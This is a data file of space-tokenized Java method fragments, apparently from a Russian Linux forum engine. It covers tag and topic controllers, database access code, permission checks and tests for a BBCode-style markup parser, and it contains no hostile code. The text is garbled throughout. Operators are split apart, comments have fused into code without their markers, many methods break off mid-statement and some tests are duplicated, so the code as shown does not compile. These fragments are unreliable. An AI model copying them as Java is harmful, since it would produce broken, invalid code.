public ModelAndView showTagListHandler ( @PathVariable String firstLetter ) throws TagNotFoundException { ModelAndView modelAndView = new ModelAndView ( " tags " ) ; SortedSet < String > firstLetters = tagService . getFirstLetters ( ) ; modelAndView . addObject ( " firstLetters " , firstLetters ) ; if ( Strings . isNullOrEmpty ( firstLetter ) ) { firstLetter = firstLetters . first ( ) ; } modelAndView . addObject ( " currentLetter " , firstLetter ) ; Map < String , Integer > tags = tagService . getTagsByFirstLetter ( firstLetter ) ; if ( tags . isEmpty ( ) ) { throw new TagNotFoundException ( " Tag list is empty " ) ; } modelAndView . addObject ( " tags " , tags ) ; return modelAndView ; } 
public ModelAndView changeTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change tagRequestChange = new TagRequest . Change ( ) ; tagRequestChange . setOldTagName ( oldTagName ) ; tagRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestChange " , tagRequestChange ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( HttpServletRequest request , @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " tagName " ) String oldTagName ) throws AccessViolationException { Template template = Template . getTemplate ( request ) ; if ( ! template . isModeratorSession ( ) ) { throw new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete tagRequestDelete = new TagRequest . Delete ( ) ; tagRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " tags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " tagRequestDelete " , tagRequestDelete ) ; return modelAndView ; } 
public ModelAndView register ( @ModelAttribute ( " form " ) RegisterRequest form , HttpServletResponse response ) { response . setHeader ( " Cache-Control " , " no-store, no-cache, must-revalidate " ) ; return new ModelAndView ( " register " ) ; } 
public synchronized void add ( Object name , Object value ) throws UnsupportedEncodingException { if ( value = = null ) { return ; } if ( ! query . trim ( ) . isEmpty ( ) ) { query + = " & " ; } query + = URLEncoder . encode ( name . toString ( ) , " UTF-8 " ) + '=' + URLEncoder . encode ( value . toString ( ) , " UTF-8 " ) ; 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( ' ' ) ; } return stringBuilder . toString ( ) . trim ( ) ; } 
public void groupsTest ( ) throws Exception { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . thenReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . getTitle ( ) ) ; } 
public void mainTopicsFeedHandler ( ) { } } 
public void getTopicsFeedYear_commonTest ( ) throws UserErrorException , TagNotFoundException { when ( tagService . getTagId ( " LOR " ) ) . thenReturn ( 123 ) ; List < Topic > topicList = topicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( 1 , topicListDto . getSections ( ) . size ( ) ) ; Integer sectionId = topicListDto . getSections ( ) . iterator ( ) . next ( ) ; assertEquals ( Integer . valueOf ( 11 ) , sectionId ) ; assertEquals ( 111 , topicListDto . getGroup ( ) ) ; assertEquals ( 123 , topicListDto . getTag ( ) ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , topicListDto . getDateLimitType ( ) ) ; assertEquals ( TopicListDao . CommitMode . COMMITED_ONLY , topicListDto . getCommitMode ( ) ) ; } 
public void getTopicsFeedYear_monthAndYearTest ( ) throws UserErrorException , TagNotFoundException { List < Topic > topicList = topicListService . getTopicsFeed ( section1 , group , " LOR " , null , 2000 , 11 ) ; assertEquals ( TopicListDto . DateLimitType . BETWEEN , topicListDto . getDateLimitType ( ) ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( 2000 , 10 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , topicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; calendar . set ( 2000 , 11 , 1 , 0 , 0 , 0 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , topicListDto . getToDate ( ) . getTime ( ) / 1000 ) ; assertNull ( topicListDto . getLimit ( ) ) ; topicList = topicListService . getTopicsFeed ( section2 , null , null , 0 , null , null ) ; assertEquals ( TopicListDto . DateLimitType . MONTH_AGO , topicListDto . getDateLimitType ( ) ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 6 ) ; assertEquals ( calendar . getTime ( ) . getTime ( ) / 1000 , topicListDto . getFromDate ( ) . getTime ( ) / 1000 ) ; assertNull ( topicListDto . getToDate ( ) ) ; assertEquals ( Integer . valueOf ( 20 ) , topicListDto . getLimit ( ) ) ; assertNull ( topicListDto . getOffset ( ) ) ; } 
public void cleanupTestData ( ) { jdbcTemplate . update ( " DELETE FROM user_TAGS WHERE user_id in ( " + user1Id + " , " + user2Id + ')' ) ; jdbcTemplate . update ( " DELETE FROM users WHERE nick LIKE 'UserTagDaoIntegrationTest_user%' " ) ; jdbcTemplate . update ( " DELETE FROM tags_values WHERE value LIKE 'UserTagDaoIntegrationTest_tag%' " 
public void maxcomTest ( ) throws Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " tango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) throws Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " tango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) throws Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertEquals ( " tango " , resultSet . getString ( " style " ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void testOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + '' + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String txt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( txt ) ) ; assertEquals ( 250 + 3 , 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [BR] " , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [B]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [I]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [S]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [STRONG]hello world[/strong] " , false ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/QUOTE] " , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [URL]http:linux.org.ru[/url] " , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/URL] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [URL=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [LIST][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/LIST] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void brTest ( ) { Assert . assertEquals ( " <p><br></p> " , lorCodeService . parseComment ( " [br] " , false ) ) ; } 
public void boldTest ( ) { Assert . assertEquals ( " <p><b>hello world</b></p> " , lorCodeService . parseComment ( " [b]hello world[/b] " , false ) ) ; } 
public void italicTest ( ) { Assert . assertEquals ( " <p><i>hello world</i></p> " , lorCodeService . parseComment ( " [i]hello world[/i] " , false ) ) ; } 
public void strikeoutTest ( ) { Assert . assertEquals ( " <p><s>hello world</s></p> " , lorCodeService . parseComment ( " [s]hello world[/s] " , false ) ) ; } 
public void emphasisTest ( ) { Assert . assertEquals ( " <p><strong>hello world</strong></p> " , lorCodeService . parseComment ( " [strong]hello world[/strong] " , false ) ) ; } 
public void quoteCleanTest ( ) { Assert . assertEquals ( " " , lorCodeService . parseComment ( " [quote][/quote] " , false ) ) ; } 
public void urlTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false ) ) ; } 
public void urlParamTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >linux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru]linux[/url] " , false ) ) ; } 
public void urlParamWithTagTest ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>l</b>inux</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]l[/b]inux[/url] " , false ) ) ; } 
public void urlParamWithTagTest2 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><b>linux</b></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][b]linux[/b][/url] " , false ) ) ; } 
public void listTest ( ) { Assert . assertEquals ( " <ul><li>one</li><li>two</li><li>three</li></ul> " , lorCodeService . parseComment ( " [list][*]one[*]two[*]three[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + " </li><li>two " + " </li><li>three " + " </li></ul> " , lorCodeService . parseComment ( " [list] n[*]one n[*]two n[*]three n[/list] " , false ) ) ; assertEquals ( " <ul><li>one " + 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false)); 
public static Group buildGroup ( ResultSet rs ) throws SQLException { int restrict_topics = rs . getInt ( " restrict_topics " ) ; if ( rs . wasNull ( ) ) { restrict_topics = TopicPermissionService . POSTSCORE_UNRESTRICTED ; } Group group = new Group ( rs . getBoolean ( " moderate " ) , rs . getBoolean ( " vote " ) , rs . getBoolean ( " havelink " ) , rs . getInt ( " section " ) , rs . getString ( " linktext " ) , rs . getString ( " urlname " ) , rs . getString ( " image " ) , restrict_topics , rs . getInt ( " restrict_comments " ) , rs . getInt ( " id " ) , rs . getInt ( " stat1 " ) , rs . getInt ( " stat3 " ) , rs . getBoolean ( " resolvable " ) ) ; group . setTitle ( rs . getString ( " title " ) ) ; group . setInfo ( rs . getString ( " info " ) ) ; group . setLongInfo ( rs . getString ( " longinfo " ) ) ; return group ; } 
public boolean isTopicPostingAllowed ( @Nonnull Group group , @Nullable User currentUser ) { int restriction = getEffectivePostscore ( group ) ; if ( restriction = = TopicPermissionService . POSTSCORE_UNRESTRICTED ) { return true ; } if ( currentUser = = null | | currentUser . isAnonymous ( ) ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restriction = = TopicPermissionService . POSTSCORE_MODERATORS_ONLY ) { return currentUser . isModerator ( ) ; 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
public Topic getById ( int id ) throws MessageNotFoundException { Topic message ; try { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Topic > ( ) { @Override public Topic mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Topic ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { noinspection ThrowInsideCatchBlockWhichIgnoresCaughtException throw new MessageNotFoundException(id); } return message; } 
public String simpleFormat ( String text ) { return StringUtil . escapeHtml ( text ) . replaceAll ( MDASH_REGEX , MDASH_REPLACE ) ; } 
public void testMDash ( ) { assertEquals ( " <ul><li><a href= \" http:www.freebsd.org/doc/en_US.ISO8859-1/books/pmake/index.html \" >PMake&nbsp;&mdash; A Tutorial</a></li></ul> " , 
public void init ( ) throws Exception { maxcom = mock ( User . class ) ; JB = mock ( User . class ) ; isden = mock ( User . class ) ; when ( maxcom . isBlocked ( ) ) . thenReturn ( false ) ; when ( JB . isBlocked ( ) ) . thenReturn ( false ) ; when ( isden . isBlocked ( ) ) . thenReturn ( true ) ; when ( maxcom . getNick ( ) ) . thenReturn ( " maxcom " ) ; when ( JB . getNick ( ) ) . thenReturn ( " JB " ) ; when ( isden . getNick ( ) ) . thenReturn ( " isden " ) ; userDao = mock ( UserDao . class ) ; when ( userDao . getUser ( " maxcom " ) ) . thenReturn ( maxcom ) ; when ( userDao . getUser ( " JB " ) ) . thenReturn ( JB ) ; when ( userDao . getUser ( " isden " ) ) . thenReturn ( isden ) ; when ( userDao . getUser ( " hizel " ) ) . thenThrow ( new UserNotFoundException ( " hizel " ) ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setConfiguration ( configuration ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; url = " http:127.0.0.1:8080/forum/talks/22464 " ; } 
public void initTest ( ) throws Exception { userDao = mock ( UserDao . class ) ; user = mock ( User . class ) ; when ( user . isBlocked ( ) ) . thenReturn ( false ) ; when ( user . getNick ( ) ) . thenReturn ( " splinter " ) ; when ( userDao . getUser ( " splinter " ) ) . thenReturn ( user ) ; mainUrl = " http:127.0.0.1:8080/ " ; mainURI = new URI ( mainUrl , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; when ( configuration . getMainUrl ( ) ) . thenReturn ( mainUrl ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setConfiguration ( configuration ) ; lorCodeService . setToHtmlFormatter ( toHtmlFormatter ) ; } 
public Image imageForTopic ( @Nonnull Topic topic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , new RowMapper < Image > ( ) { @Override public Image mapRow ( ResultSet rs , int i ) throws SQLException { return new Image ( rs . getInt ( " id " ) , rs . getInt ( " topic " ) , rs . getString ( " original " ) , rs . getString ( " icon " ) ) ; } } , topic . getId ( ) ) ; if ( found . size ( ) = = 0 ) { return null ; 
public boolean isImageAllowed ( ) { return imageAllowed ; } 
private void prepareModel ( AddTopicRequest form , Map < String , Object > params ) { Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " section " , sectionService . getSection ( group . getSectionId ( ) ) ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; } params . put ( " topTags " , tagService . getTopTags ( ) ) ; } 
public boolean isImagePostingAllowed ( @Nonnull Section section , @Nullable User currentUser ) { if ( section . isImagepost ( ) ) { return true ; } if ( currentUser ! = null & & currentUser . isAdministrator ( ) ) { return section . isImageAllowed ( ) ; } return false ; } 
private void prepareModel ( AddTopicRequest form , Map < String , Object > params , User currentUser ) { Group group = form . getGroup ( ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; Section section = sectionService . getSection ( group . getSectionId ( ) ) ; params . put ( " section " , section ) ; params . put ( " addportal " , sectionService . getAddInfo ( group . getSectionId ( ) ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } params . put ( " topTags " , tagService . getTopTags ( ) ) ; } 
public void addTag ( int userId , int tagId , boolean isFavorite ) { MapSqlParameterSource parameters = new MapSqlParameterSource ( ) ; parameters . addValue ( " user_id " , userId ) ; parameters . addValue ( " tag_id " , tagId ) ; parameters . addValue ( " is_favorite " , isFavorite ) ; try { jdbcTemplate . update ( 
public void addTest ( ) { prepareUserTags ( ) ; userTagDao . addTag ( user1Id , tag1Id , false ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 5 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 0 , result ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , tag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { EditHistoryDto editHistoryDto = new EditHistoryDto ( ) ; editHistoryDto . setId ( resultSet . getInt ( " id " ) ) ; editHistoryDto . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editHistoryDto . setEditor ( resultSet . getInt ( " editor " ) ) ; editHistoryDto . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editHistoryDto . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editHistoryDto . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editHistoryDto . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editHistoryDto . setObjectType ( resultSet . getString ( " object_type " ) ) ; editHistoryDto . setOldminor ( resultSet . getBoolean ( " oldminor " ) ) ; if ( resultSet . wasNull ( ) ) { editHistoryDto . setOldminor ( null ) ; } editInfoDTOs . add ( editHistoryDto ) ; } 
public Image imageForTopic ( @Nonnull Topic topic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? " , new ImageRowMapper ( ) , topic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public Image mapRow ( ResultSet rs , int i ) throws SQLException { return new Image ( rs . getInt ( " id " ) , 
public boolean isEditable ( ) { return tagsEditable | | topicEditable ; } 
public boolean isTopicEditable ( ) { return topicEditable ; } 
public boolean isTagsEditable ( ) { return tagsEditable ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user ) { List < PersonalizedPreparedTopic > pm = new ArrayList < PersonalizedPreparedTopic > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public ModelAndView deleteForm ( @RequestParam ( required = true ) int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam ( required = true ) int id , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Image image = imageDao . getImage ( id ) ; Topic topic = topicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( topic , request . isSecure ( ) , tmpl . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , tmpl . getCurrentUser ( ) ) ; imageDao . deleteImage ( image ) ; return new RedirectView ( topic . getLinkLastmod ( ) ) ; } 
public Image imageForTopic ( @Nonnull Topic topic ) { List < Image > found = jdbcTemplate . query ( " SELECT id, topic, original, icon FROM images WHERE topic=? AND NOT deleted " , new ImageRowMapper ( ) , topic . getId ( ) ) ; if ( found . isEmpty ( ) ) { return null ; 
public void deleteImage ( Image image ) { jdbcTemplate . update ( " UPDATE images SET deleted='true' WHERE id=? " , image . getId ( ) ) ; } 
